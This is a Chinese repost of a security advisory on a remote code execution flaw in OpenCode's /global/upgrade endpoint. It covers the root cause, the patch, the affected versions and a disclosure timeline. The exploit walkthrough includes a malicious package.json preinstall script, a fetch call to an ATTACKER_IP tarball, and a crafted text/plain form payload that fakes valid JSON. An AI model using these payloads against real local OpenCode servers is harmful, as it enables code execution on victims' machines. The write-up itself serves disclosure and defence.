#  OpenCode 曝远程代码执行漏洞：一个 Content-Type 混淆如何变成 RCE  
 幻泉之洲   2026-09-30 02:05  
  
>   
  
  
OpenCode 是 2025 年 6 月发布的开源 AI 编码代理，官网称其 GitHub star 已超 20 万，月活用户 1600 万。开发方是 Anomaly。  
  
这篇文章要讲的，是我们在 OpenCode 里发现的远程代码执行（RCE）漏洞 GHSA-632h-h47v-g4x4。问题出在 /global/upgrade  
 接口的 Content-Type 混淆上——它把一个底层的代码注入缺陷变得可以实际利用。OpenCode 1.18.22 修复了该漏洞。  
  
先确认自己是否受影响，往下看"如何判断你是否受影响"一节。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibd8t9whVV0Vg2DoMU3f8sImkVHAUXX8pgBs8iaa2WibQiaiaaP3ibRq9Yxpoy5GU38MdhhuS6HgazYzsm93g22XpE3oUk0x6lCEjOXY/640?wx_fmt=png&from=appmsg "")  
  
▲ OpenCode 远程代码执行攻击流程（点击放大）  
>   
  
## OpenCode 和它的 Web 界面  
  
OpenCode 是个开源 AI 编码代理，和 Claude Code、Codex、Pi 是同类产品。开发者可以用 Anthropic、OpenRouter 等服务商的模型，也可以跑本地模型。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6Tibc9m86uIZ83Jv3WaQDibhibicDpAgQ80CCpDch9JRdk5ktqhDeRuLb2dna4aw8o5S41HJF1YAVSCDmNOlPkTicfM6NKCc5Y09hZ82k/640?wx_fmt=jpeg&from=appmsg "")  
  
▲ OpenCode 终端界面（点击放大）  
  
它还自带一个 Web 界面，可以在浏览器里跑编码会话。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibfrVXmvlpV9VXfFibkdGxrvWh6A8cMU89uv4OPsxSdr9BUa7Mr5n5j5r35lMicB88R5xC4dBrOsmm1ALlDBVaAPgXuzVhLdTLEnY/640?wx_fmt=jpeg&from=appmsg "")  
  
▲ OpenCode Web UI（点击放大）  
  
运行 opencode serve  
 就能启动这个界面，等价的 opencode web  
 命令还会顺便在默认浏览器里打开它。  
  
$ opencode web  
  
  
!  OPENCODE_SERVER_PASSWORD is not set; server is unsecured.  
  
  Web interface:      http://127.0.0.1:4096/  
  
Web 界面默认不需要认证。但开发者可以开启 basic 认证——把 OpenCode 暴露到网络上时，这一步尤其重要：  
  
OPENCODE_SERVER_PASSWORD=whySoSerious opencode web  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibfeEQEWmUicVU60ZOicVXpzv9aksJHRGc9UPS3cSm9icohj2lWUNo97M7VFo9eHXeqazCsAmZb42rp5gAZD9ibo0Rh6uIzGxWR64n8/640?wx_fmt=jpeg&from=appmsg "")  
  
▲ OpenCode 的 basic 认证（点击放大）  
  
浏览器会缓存 basic 认证的凭据，所以 OpenCode 不会在每个请求上都要求输入密码。具体行为取决于浏览器和版本，但现代浏览器在主进程运行期间会一直缓存。  
## 怎么利用这个漏洞拿到 RCE  
  
攻击者只需要两样东西：一个恶意 npm 包 tarball，和一个网页。  
  
第一步，把恶意 npm 包放在公开 URL 上。包可以极简，只要一个 package.json  
，通过 preinstall  
 脚本执行恶意代码：  
  
{  
  
  "name": "opencode-ai",  
  
  "version": "1.0.0",  
  
  "description": "",  
  
  "scripts": {  
  
    "preinstall": "open /System/Applications/Calculator.app && id > /tmp/opencode-rce"  
  
  }  
  
}  
  
然后打成 tarball：  
  
tar -czf opencode-malicious.tgz malicious-package/  
  
最后，托管一个网页，向 http://127.0.0.1:4096/global/upgrade  
 发一个顶层跨域请求：  
  
document.forms[0].submit()  
  
当运行着有漏洞版本 OpenCode 的用户访问这个网页时，preinstall  
 脚本就会在那台机器上执行。  
  
下面的视频展示了从 1.18.21 版本用户视角看到的利用过程。  
## 漏洞的定位和利用细节  
  
opencode serve  
 启动的 API 里有个 upgrade 端点，作用是把 OpenCode 升级到最新版或指定版本：  
  
POST /global/upgrade HTTP/1.1  
  
Host: 127.0.0.1:4096  
  
Content-Type: text/plain  
  
  
{"target":"1.18.1"}  
  
下面这个 TypeScript 函数实现了 upgrade 端点：  
  
upgrade: Effect.fn("Installation.upgrade")(function* (m: Method, target: string) {  
  
  let upgradeResult: { code: number; stdout: string; stderr: string } | undefined  
  
  switch (m) {  
  
    case "curl":  
  
      upgradeResult = yield* upgradeCurl(target)  
  
      break  
  
    case "npm":  
  
      upgradeResult = yield* run(["npm", "install", "-g", `opencode-ai@${target}`])  
  
      break  
  
    case "pnpm":  
  
      upgradeResult = yield* run(["pnpm", "install", "-g", `opencode-ai@${target}`])  
  
      break  
  
    case "bun":  
  
      upgradeResult = yield* run(["bun", "install", "-g", `opencode-ai@${target}`])  
  
      break  
  
...  
  
如果用户是通过 npm、pnpm 或 Bun 安装的 OpenCode，服务端会用 child_process.spawn()  
 跑这样一条命令：  
  
npm install -g opencode-ai@VERSION  
  
# VERSION 是未经校验的用户输入  
  
问题就在这里。npm 的包描述规范既接受 1.18.1  
 这样的语义化版本号，也接受远程 tarball 作为安装目标。也就是说，攻击者可以塞进任意 URL。npm 会乖乖去攻击者控制的服务器上把包拉下来装上。  
  
要实现远程代码执行，攻击者只需要造一个带 preinstall  
 生命周期脚本的包：  
  
mkdir -p malicious-package  
  
cat > malicious-package/package.json <<'EOF'  
  
...  
  
EOF  
  
tar -czf opencode-malicious.tgz malicious-package  
## 跨域利用：浏览器帮了攻击者什么忙  
  
直接发 HTTP 请求需要能访问到 OpenCode 服务端，而它通常只监听 127.0.0.1。但恶意网页可以借受害者的浏览器去够到本机服务。  
### 先看浏览器的跨域保护  
  
攻击者大概会先用 JavaScript 试一发：  
  
fetch("http://127.0.0.1:4096/global/upgrade", {  
  
  method: "POST",  
  
  headers: {  
  
    "Content-Type": "application/json",  
  
  },  
  
  body: JSON.stringify({  
  
    target: "http://ATTACKER_IP/opencode-malicious.tgz",  
  
  }),  
  
})  
  
浏览器通过 CORS 限制跨域 fetch()  
。因为这里用了 application/json  
，浏览器会先发一个预检请求，问端点是否允许该来源、方法和头：  
  
OPTIONS /global/upgrade HTTP/1.1  
  
Access-Control-Request-Headers: content-type  
  
Access-Control-Request-Method: POST  
  
Host: 127.0.0.1:4096  
  
Origin: http://attacker:4444  
  
Referer: http://attacker:4444/  
  
只有服务端返回匹配的 Access-Control-Allow-Origin  
、Access-Control-Allow-Methods  
、Access-Control-Allow-Headers  
，浏览器才会往下走。OpenCode API 对 http://attacker:4444  
 不返回 Access-Control-Allow-Origin  
，所以浏览器不会发出那个 POST：  
  
HTTP/1.1 204 No Content  
  
Access-Control-Allow-Methods: GET, HEAD, PUT, PATCH, POST, DELETE  
  
Vary: Access-Control-Request-Headers  
  
Access-Control-Allow-Headers: content-type  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibeOG5IqLOBbVnPG20C8husTneg3rayhN5nMOXEGvaMGyib1OjbEa5TD0jOUYgOsjhSOAVicaPaLIExicXvTrM6b342H5waBqKz3SA/640?wx_fmt=jpeg&from=appmsg "")  
  
▲ Chrome 开发者工具显示请求被拦截（点击放大）  
  
即使某个 API 允许跨域，现代浏览器还有第二道防线。Chrome 142、Firefox 151、Edge 143 引入的 Local Network Access，会在页面跨域访问 localhost 或解析到 localhost 的主机名之前弹窗询问用户。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibeGpN6EjCDEyxW0mSzPEomZvAywTLTsIQ5P71yWmcM7mwA9A31O7cZ3lNh0U8Q6z96yPaMT4axo816Dlm72z6cvJ5IXcMjVIRY/640?wx_fmt=jpeg&from=appmsg "")  
  
▲ Web 应用跨域访问本地 URL 时，Local Network Access 会弹窗提示（点击放大）  
  
但 CORS 和 Local Network Access 按设计都不拦截顶层导航。攻击者正是靠这个，从恶意网页够到本机的 OpenCode 服务。  
### 用顶层导航发一个恶意 POST  
  
HTML 表单可以通过顶层导航提交 POST。要看懂怎么构造这个表单，先得看 OpenCode 怎么解析请求体。src/server/routes/instance/httpapi/handlers/global.ts  
 里的控制器有这么一段逻辑：  
  
function parseBody(body: string) {  
  
  try {  
  
    return JSON.parse(body || "{}") as unknown  
  
  } catch {  
  
    return undefined  
  
  }  
  
}  
  
  
export const globalHandlers = HttpApiBuilder.group(RootHttpApi, "global", (handlers) =>  
  
  Effect.gen(function* () {  
  
    const upgradeRaw = Effect.fn("GlobalHttpApi.upgradeRaw")(function* (ctx: {  
  
      request: HttpServerRequest.HttpServerRequest  
  
    }) {  
  
      const body = yield* Effect.orDie(ctx.request.text)  
  
      const json = parseBody(body)  
  
      if (json === undefined) {  
  
        return HttpServerResponse.jsonUnsafe({ success: false, error: "Invalid request body" }, { status: 400 })  
  
      }  
  
      const payload = yield* Schema.decodeUnknownEffect(GlobalUpgradeInput)(json).pipe(  
  
        Effect.map((payload) => ({ valid: true as const, payload })),  
  
        Effect.catch(() => Effect.succeed({ valid: false as const })),  
  
      )  
  
      if (!payload.valid) {  
  
        return HttpServerResponse.jsonUnsafe({ success: false, error: "Invalid request body" }, { status: 400 })  
  
      }  
  
      const result = yield* upgrade({ payload: payload.payload }) // 这行就是代码注入的入口  
  
      return HttpServerResponse.jsonUnsafe(result.body, { status: result.status })  
  
    })  
  
  
    return handlers  
  
      .handleRaw("upgrade", upgradeRaw)  
  
  })  
  
GlobalUpgradeInput  
 的定义只有一个 target  
 字段：  
  
export const GlobalUpgradeInput = Schema.Struct({  
  
  target: Schema.optional(Schema.String),  
  
})  
  
upgradeRaw  
 期望 JSON，所以它会拒绝标准 HTML 表单提交——默认的 application/x-www-form-urlencoded  
 类型对不上：  
  
document.forms[0].submit()  
  
表单会发出这样的请求，然后收到错误：  
  
POST /global/upgrade HTTP/1.1  
  
Content-Type: application/x-www-form-urlencoded  
  
Host: 127.0.0.1:4096  
  
Origin: http://attacker:4444  
  
  
target=http%3A%2F%2FATTACKER_IP%2Fopencode-malicious.tgz  
  
HTTP/1.1 400 Bad Request  
  
Content-Type: application/json  
  
Date: Wed, 23 Sep 2026 11:35:12 GMT  
  
Content-Length: 48  
  
  
{"success":false,"error":"Invalid request body"}  
  
HTML 表单的 enctype  
 不支持 application/json  
。剩下的选项里，multipart/form-data  
 生不出合法 JSON，那就只剩 text/plain  
 了。  
  
关键在于：upgradeRaw  
 直接拿 body 当 JSON 解析，压根不检查 Content-Type 是不是 application/json  
。只要 body 是合法 JSON，text/plain  
 的表单提交它照样收。  
  
当浏览器用 enctype="text/plain"  
 提交表单时，请求体长这样：  
  
param1=value1  
  
param2=value2  
  
...  
  
浏览器不会对参数名和值做转义或 URL 编码。于是我们可以构造出能拼成合法 JSON 的参数名和值：  
- 参数名：{"target":"http://ATTACKER_IP/opencode-malicious.tgz","x":"  
  
- 参数值："}  
  
浏览器会在名字和值中间插一个等号，拼出下面这段合法 JSON：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibfHX0ytfR7WyviaNB5PHIfMHrtHTPPVuicSibfXGfvBMLGg50A9e6DwICkYgaiaNGmuCJbEL8iciauYJE3drUlO2Y7mLeZA2MICH8YRU/640?wx_fmt=jpeg&from=appmsg "")  
  
▲ 浏览器在参数名和值之间插入等号，恰好拼出合法 JSON（点击放大）  
  
最终的表单是这样：  
  
document.forms[0].submit()  
  
受害者一访问网页，浏览器就以顶层导航的方式发出这个跨域 POST 请求。有漏洞的 OpenCode 端点会接受它：  
  
POST /global/upgrade HTTP/1.1  
  
Content-Type: text/plain  
  
Host: 127.0.0.1:4096  
  
Origin: http://165.227.82.252:4444  
  
Pragma: no-cache  
  
Referer: http://165.227.82.252:4444/  
  
  
{"target":"http://165.227.82.252/opencode-malicious.tgz","x":"="}  
  
  
HTTP/1.1 200 OK  
  
Content-Type: application/json  
  
Date: Wed, 23 Sep 2026 11:48:15 GMT  
  
Content-Length: 73  
  
  
{"success":true,"version":"http://165.227.82.252/opencode-malicious.tgz"}  
## 官方是怎么修的  
  
PR #44686 在 2026 年 8 月 24 日以 commit c6e76e9 合并，修掉了漏洞。补丁同时处理了两个问题：把升级目标限制成语义化版本，以及强制校验请求的 Content-Type。  
  
第一处，GlobalUpgradeInput  
 现在只接受合法的语义化版本号：  
  
- export const GlobalUpgradeInput = Schema.Struct({  
  
-   target: Schema.optional(Schema.String),  
  
- })  
  
+ export const GlobalUpgradeInput = Schema.Struct({  
  
+   target: Schema.String.check(  
  
+     Schema.makeFilter((value) => (semver.valid(value) === null ? "Expected a semantic version" : undefined)),  
  
+   ),  
  
+ })  
  
第二处，补丁用 handle  
 替换了 Effect 的 handleRaw  
。handle  
 会先看 Content-Type 头，再据此解码请求体，从根上堵住了服务端的 Content-Type 混淆：  
  
- .handleRaw("upgrade", upgradeRaw)  
  
+ .handle("upgrade", upgrade)  
  
OpenCode 1.18.22 会用一个"不支持的媒体类型"响应打发掉恶意跨域请求：  
  
HTTP/1.1 415 Unsupported Media Type  
  
Content-Type: text/plain  
  
Date: Wed, 23 Sep 2026 12:48:47 GMT  
  
Content-Length: 36  
  
  
Unsupported content-type: text/plain  
## 影响面有多大  
  
受影响的是 1.14.30 到 1.18.21 版本，且必须是通过 npm、pnpm 或 Bun 安装的。  
  
看公开的 npm 数据，这 82 个受影响版本在 2026 年 9 月 17 日到 23 日之间被下载了 64.7 万次以上。这个数字看不出有多少独立用户或机器，也看不出其中有多少人在跑 opencode serve  
 或 opencode web  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibeSD5cQLKLuiaZXWnNQ3dYbvjbJdUdyHJvQickw9VVWmMhqbJlicu3JrHq9CmrEQHQpc4pUJOOZnecL2nh6ibttWAVVDBCkOxfjz9o/640?wx_fmt=jpeg&from=appmsg "")  
  
▲ 2026 年 9 月 17–23 日，OpenCode 下载量中有 38.9% 来自受影响版本（点击放大）  
## 如何判断你是否受影响  
  
只有下面三个条件同时成立，漏洞才可被利用：  
- 你用的 OpenCode 版本在 1.14.30 到 1.18.21 之间（含两端）。  
  
- 你运行 opencode serve  
 或 opencode web  
 时没设密码认证，或者浏览器刚缓存过认证凭据。  
  
- 你是通过 npm、pnpm 或 Bun 安装的。跑 ls -l "$(command -v opencode)"  
 可以确认安装方式。  
  
## 时间线  
<table><thead><tr><th><section><span leaf="">日期</span></section></th><th><section><span leaf="">事件</span></section></th></tr></thead><tbody><tr><td><section><span leaf="">2026 年 4 月 29 日</span></section></td><td><section><span leaf="">PR #24853 引入有漏洞的代码路径</span></section></td></tr><tr><td><section><span leaf="">2026 年 4 月 30 日</span></section></td><td><section><span leaf="">OpenCode v1.14.30 成为首个受影响版本</span></section></td></tr><tr><td><section><span leaf="">2026 年 8 月 11 日</span></section></td><td><section><span leaf="">Datadog Security Labs 发现漏洞</span></section></td></tr><tr><td><section><span leaf="">2026 年 8 月 11 日</span></section></td><td><section><span leaf="">Datadog Security Labs 通过 GitHub Security Advisories 报告（GHSA-632h-h47v-g4x4）</span></section></td></tr><tr><td><section><span leaf="">2026 年 8 月 24 日</span></section></td><td><section><span leaf="">Anomaly 提交修复 PR #44686</span></section></td></tr><tr><td><section><span leaf="">2026 年 8 月 24 日</span></section></td><td><section><span leaf="">Anomaly 合并 PR #44686</span></section></td></tr><tr><td><section><span leaf="">2026 年 8 月 24 日</span></section></td><td><section><span leaf="">Anomaly 发布含修复的 OpenCode v1.18.22</span></section></td></tr><tr><td><section><span leaf="">2026 年 8 月 24 日</span></section></td><td><section><span leaf="">应 Anomaly 要求，Datadog Security Labs 推迟一个月公布</span></section></td></tr><tr><td><section><span leaf="">2026 年 9 月 24 日</span></section></td><td><section><span leaf="">Datadog Security Labs 发布本文，Anomaly 发布 GHSA-632h-h47v-g4x4 公告</span></section></td></tr></tbody></table>  
感谢 Anomaly 团队在整个过程中保持开放沟通，并在收到报告后迅速完成了修复。  
### 参考资料  
  
[1]   
https://securitylabs.datadoghq.com/articles/opencode-upgrade-remote-code-execution/  
  
